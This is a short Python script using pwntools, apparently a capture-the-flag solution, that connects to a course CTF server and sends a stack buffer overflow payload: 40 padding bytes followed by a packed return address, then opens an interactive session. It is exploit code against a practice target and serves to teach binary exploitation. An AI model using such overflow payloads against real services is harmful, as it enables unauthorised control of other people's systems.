#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10120)

addr = 0x0000000000400566

r.sendline('a' * 40 + p64(addr))
r.interactive()
